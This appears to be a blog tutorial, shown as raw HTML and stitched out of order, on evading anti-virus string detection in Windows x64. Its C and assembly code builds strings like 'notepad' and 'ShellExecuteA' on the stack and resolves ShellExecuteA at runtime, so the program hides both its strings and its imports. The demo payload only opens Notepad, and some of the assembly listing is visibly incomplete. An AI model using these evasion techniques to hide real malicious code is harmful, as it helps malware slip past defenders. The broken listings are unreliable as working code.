class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;d&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;l&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;l&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;};&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;HANDLE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;hShell32&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;LoadLibrary&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ca_shell32&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ca_shellExA&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;S&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;h&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;e&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;l&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;l&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;E&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;x&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;e&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;c&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;u&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;t&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;e&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;A&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;};&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;_ShellExecuteA&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;fShellExecuteA&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;_ShellExecuteA&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;GetProcAddress&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;hShell32&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ca_shellExA&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;And now we can see that it works!&lt;/p&gt;
&lt;p&gt;&lt;img alt="string-anti-virus-evasion-in-x64-assembly-part-2-06" src="https://www.accidentalrebel.com/images/string-anti-virus-evasion-in-x64-assembly-part-2-06.png" /&gt;&lt;/p&gt;
&lt;h2 id="converting-to-assembly"&gt;Converting to assembly&lt;/h2&gt;
&lt;p&gt;As promised, we'll be converting the code above into x64 windows assembly. It's an extra step, but can give us a better understanding by approaching it from a different programming language.&lt;/p&gt;
&lt;p&gt;Starting from the beginning, we'll be using &lt;code&gt;LoadLibraryA&lt;/code&gt; and &lt;code&gt;GetProcAddress&lt;/code&gt; to dynamically load the &lt;code&gt;ShellExecuteA&lt;/code&gt; function at runtime. &lt;/p&gt;
&lt;p&gt;If we fast forward a bit, here's what we'll end up with:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;lea&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rcx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;str_shell32&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="c1"&gt;; Load &amp;quot;shell32.dll&amp;quot; string&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;sub&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;call&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;LoadLibraryA&lt;/span&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="c1"&gt;; Call &amp;quot;LoadLibraryA&amp;quot;&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;add&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rcx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rax&lt;/span&gt;&lt;span class="w"&gt;               &lt;/span&gt;&lt;span class="c1"&gt;; Save result of LoadLibraryA to rcx&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;lea&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rdx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;str_shexa&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="c1"&gt;; Load &amp;quot;ShellExecuteA&amp;quot; string&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;sub&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;call&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;GetProcAddress&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="c1"&gt;; Call &amp;quot;GetProcAddress&amp;quot;&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;add&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rbx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rax&lt;/span&gt;&lt;span class="w"&gt;               &lt;/span&gt;&lt;span class="c1"&gt;; The address of &amp;quot;ShellExecuteA&amp;quot; is saved to rbx&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="na"&gt;...&lt;/span&gt;&lt;span class="w"&gt;                        &lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;...&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;call&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;rbx&lt;/span&gt;&lt;span class="w"&gt;                &lt;/span&gt;&lt;span class="c1"&gt;; Call &amp;quot;ShellExeecuteA&amp;quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Wait, that's it? Yes! &lt;/p&gt;
&lt;p&gt;This is the one of those rare moments that the Assembly code is more straightforward than C. This is because the value returned by &lt;code&gt;GetProcAddresss&lt;/code&gt; is already an address. Since assembly deals with memory addresses, there's no need for any conversion like we did in the C version. The address can be called directly.&lt;/p&gt;
&lt;p&gt;And just like the previous one, the code above is still not complete. The "shell" strings are still visible via &lt;code&gt;strings.exe&lt;/code&gt; so we need to apply the technique again from Part 1. I won't be showing it step by step here anymore as it's quite lengthy.&lt;/p&gt;
&lt;p&gt;This means that this example piece of code:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;lea&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rcx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;str_shell32&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="c1"&gt;; Load &amp;quot;shell32.dll&amp;quot; string&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;sub&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;call&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;LoadLibraryA&lt;/span&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="c1"&gt;; Call &amp;quot;LoadLibraryA&amp;quot;&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;add&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Will now be like this:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;sub&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="w"&gt;          &lt;/span&gt;&lt;span class="c1"&gt;; Place &amp;quot;shell32.dll&amp;quot; string to the stack&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;lea&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rcx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;sub&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;code&gt;addstr2stack&lt;/code&gt; is a macro we've written before &lt;a href="string-av-evasion-in-x64-assembly-part-1"&gt;in part 1&lt;/a&gt;. It makes declaring an string array easier.&lt;/p&gt;
&lt;p&gt;Combining everything again, here's the final assembly code with comments:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;push&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;rbp&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="no"&gt;rbp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;sub&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;;; = START LOADLIBRARY ===========================================&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;sub&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="w"&gt;         &lt;/span&gt;&lt;span class="c1"&gt;; Place &amp;quot;shell32.dll&amp;quot; string to the stack&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;xor&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;r9&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;r9&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;lea&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rdx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;msg_open&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;xor&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rcx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rcx&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;sub&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;call&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;r12&lt;/span&gt;&lt;span class="w"&gt;         &lt;/span&gt;&lt;span class="c1"&gt;; Call &amp;quot;ShellExecuteA&amp;quot;, jump to addres&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;add&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;add&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="w"&gt;         &lt;/span&gt;&lt;span class="c1"&gt;; Release &amp;quot;notepad&amp;quot; string from stack&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;;; = END SHELLEXECUTEA ===========================================&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;xor&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="no"&gt;rax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rax&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;call&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;ExitProcess&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;I know there's a lot to digest with the code above. I've made the flow similar to the flow of the C program so you can review them side by side if you feel lost. Hopefully, the comments and the separators would also help.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; Pay special attention to how the stack is reserved (with &lt;code&gt;sub rsp, 16&lt;/code&gt;) and released (with &lt;code&gt;add rsp, 16&lt;/code&gt;). I did not discuss stack alignments as it's a lengthy explanation in itself. But just remember that we are releasing the data once we've finished passing it to the function.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;If done correctly, the strings would not be detectable because the data is now on the stack and not in the &lt;code&gt;.data&lt;/code&gt; segment.&lt;/p&gt;
&lt;p&gt;&lt;img alt="string-anti-virus-evasion-in-x64-assembly-part-2-06" src="https://www.accidentalrebel.com/images/string-anti-virus-evasion-in-x64-assembly-part-2-06.png" /&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;It is important to note that anti-viruses can employ different techniques to do detection, but a huge part of their functionality will rely on detecting malicious strings. So at least, on that front, we now have an idea on how to defeat it.&lt;/p&gt;
&lt;p&gt;You can view the code for part 1 and 2 &lt;a href="https://github.com/accidentalrebel/string-anti-virus-evasion-x64-assembly"&gt;on Github&lt;/a&gt;. Updates and fixes will be placed there.&lt;/p&gt;
&lt;p&gt;I might post more assembly shenanigans in the future, so stay tuned.&lt;/p&gt;

The author posits that one part of an anti-virus detection capability is through checking for suspicious strings in an executable.&lt;/p&gt;
&lt;p&gt;For the purpose of this post, let's pretend that "notepad" is a suspicious string that we don't want be detected by the anti-virus.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;#include&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="cpf"&gt;&amp;lt;windows.h&amp;gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="cpf"&gt;&amp;lt;shellapi.h&amp;gt;&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;ShellExecute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;open&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;notepad&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;SW_SHOW&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;blockquote&gt;
&lt;p&gt;You might think that a call to &lt;code&gt;ShellExecute&lt;/code&gt; is already a big red flag, and you are right. It is! But we'll talk about hiding API calls on the next post. Let's focus on the parameter for now.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;In the place of the anti-virus, we'll be using the &lt;code&gt;strings&lt;/code&gt; command to check for visible strings like so:&lt;/p&gt;
&lt;p&gt;&lt;img alt="string-anti-virus-evasion-in-x64-assembly-part-1-01" src="https://www.accidentalrebel.com/images/string-anti-virus-evasion-in-x64-assembly-part-1-01.png" /&gt;&lt;/p&gt;
&lt;p&gt;As expected, the word "notepad" is easily detected. This is becaues any string that we declare and initialize in a program gets placed in the &lt;code&gt;.data&lt;/code&gt; segment in memory by the compiler:&lt;/p&gt;
&lt;p&gt;&lt;img alt="string-anti-virus-evasion-in-x64-assembly-part-1-02" src="https://www.accidentalrebel.com/images/string-anti-virus-evasion-in-x64-assembly-part-1-02.png" /&gt;&lt;/p&gt;
&lt;p&gt;To prevent detection, we need a way for the string to not be present in our compiled executable.&lt;/p&gt;
&lt;h2 id="the-solution"&gt;The solution&lt;/h2&gt;
&lt;p&gt;The solution is to declare the string to be passed as the parameter like so:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ca_notepad&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;n&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;o&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;t&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;e&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;p&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;d&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;};&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;ShellExecute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;open&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ca_notepad&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;SW_SHOW&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;And when &lt;code&gt;strings&lt;/code&gt; is run, we now see that the "notepad" string is not present anymore.&lt;/p&gt;
&lt;p&gt;&lt;img alt="string-anti-virus-evasion-in-x64-assembly-part-1-03" src="https://www.accidentalrebel.com/images/string-anti-virus-evasion-in-x64-assembly-part-1-03.png" /&gt;&lt;/p&gt;
&lt;p&gt;How did this happen?&lt;/p&gt;
&lt;p&gt;This is because data contained in arrays are placed on the stack instead of the &lt;code&gt;.data&lt;/code&gt; segment when declared within a function (And also, as long as it is not declared as static).&lt;/p&gt;
&lt;p&gt;To further understand how this happens, let's convert this C program into x64 assembly.&lt;/p&gt;
&lt;h2 id="converting-to-x64-assembly"&gt;Converting to x64 assembly&lt;/h2&gt;
&lt;p&gt;First, we setup our boilerplate code with an entry point and a call to &lt;code&gt;ExitProcess&lt;/code&gt;.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;bits&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;64&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;default&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rel&lt;/span&gt;

&lt;span class="nf"&gt;segment&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;.text&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;global&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;main&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;extern&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;ExitProcess&lt;/span&gt;

&lt;span class="nl"&gt;main:&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;push&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;rbp&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="no"&gt;rbp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;

